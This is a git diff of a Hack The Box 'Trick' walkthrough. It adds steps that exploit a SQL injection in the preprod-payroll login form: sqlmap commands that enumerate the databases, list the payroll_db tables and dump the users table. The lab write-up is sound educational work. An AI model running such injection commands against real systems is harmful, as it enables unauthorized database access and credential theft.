@@ -1,7 +1,7 @@
 # HTB Trick
 ![Alt text](./Trick/trick.png?raw=true "Card")
 
-#### 1. NMAP SCAN
+## 1. NMAP SCAN
 
 As a first step I did a nmap scan on the address with the following result:
 
@@ -32,7 +32,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 55.50 seconds
                                                             
 ```
-#### 2. Add machine ip to /etc/hosts
+## 2. Add machine ip to /etc/hosts
 
 Add 10.10.11.166 in /etc/hosts with the following command:
 
@@ -40,7 +40,7 @@ Add 10.10.11.166 in /etc/hosts with the following command:
 echo "10.10.11.166 trick.htb">>/etc/hosts
 ```
 
-#### 3. Check the what's on port 80
+## 3. Check the what's on port 80
 
 Going on the web page we see as follow:
 
@@ -74,4 +74,68 @@ We notice that there is a subdomain called **preprod-payroll.trick.htb**. Let's 
 
 ![Alt text](./Trick/preprod-payroll.trick.htb.png?raw=true "Web Page")
 
+We can see that we are in a login page.
+## **4. Scan preprod-payroll.trick.htb**
+
+I run a scan with BurpSuite and it found a SQL Injection!
+
+![Alt text](./Trick/Burp.png?raw=true "Web Page")
+## **4. Check for SQL Injection**
+
+Let's try to use a random usernale and password (admin/admin) to check the errors, if any.
+
+The error is generic, **Username or password is incorrect.** .
+
+Let's copy the request as a CURL request and use it in sqlmap, replacing curl with sqlmap.
+
+```
+└─# sqlmap 'http://preprod-payroll.trick.htb/ajax.php?action=login' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://preprod-payroll.trick.htb' -H 'Connection: keep-alive' -H 'Referer: http://preprod-payroll.trick.htb/login.php' -H 'Cookie: PHPSESSID=lk81fvs6lkqiv43o3ddeo50hq5' --data-raw 'username=admin&password=admin' --batch  
+```
+
+Here we are!!! We found a sql injection.
+
+Let's re-run the command with the **--dbs** option to check the DBs. 
+
+```
+└─# sqlmap 'http://preprod-payroll.trick.htb/ajax.php?action=login' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://preprod-payroll.trick.htb' -H 'Connection: keep-alive' -H 'Referer: http://preprod-payroll.trick.htb/login.php' -H 'Cookie: PHPSESSID=lk81fvs6lkqiv43o3ddeo50hq5' --data-raw 'username=admin&password=admin' --dbs
+```
+
+We get 2 DBs:
+1. information_schema
+2. payroll_db
+
+Let's see what is inside the **payroll_db**, use the options **-D payroll_db --tables** instead of **--dbs** 
+
+```
+└─# sqlmap 'http://preprod-payroll.trick.htb/ajax.php?action=login' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://preprod-payroll.trick.htb' -H 'Connection: keep-alive' -H 'Referer: http://preprod-payroll.trick.htb/login.php' -H 'Cookie: PHPSESSID=lk81fvs6lkqiv43o3ddeo50hq5' --data-raw 'username=admin&password=admin' -D payroll_db --tables
+
+```
+
+The result is:
+
+```
+Database: payroll_db
+[11 tables]
++---------------------+
+| position            |
+| allowances          |
+| attendance          |
+| deductions          |
+| department          |
+| employee            |
+| employee_allowances |
+| employee_deductions |
+| payroll             |
+| payroll_items       |
+| users               |
++---------------------+
+
+```
+
+Let's see what's inside the **users** table, replacing **--tables** with **-T users --dump**
+
+```
+└─# sqlmap 'http://preprod-payroll.trick.htb/ajax.php?action=login' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://preprod-payroll.trick.htb' -H 'Connection: keep-alive' -H 'Referer: http://preprod-payroll.trick.htb/login.php' -H 'Cookie: PHPSESSID=lk81fvs6lkqiv43o3ddeo50hq5' --data-raw 'username=admin&password=admin' -D payroll_db -T users --dump
+
+```
 
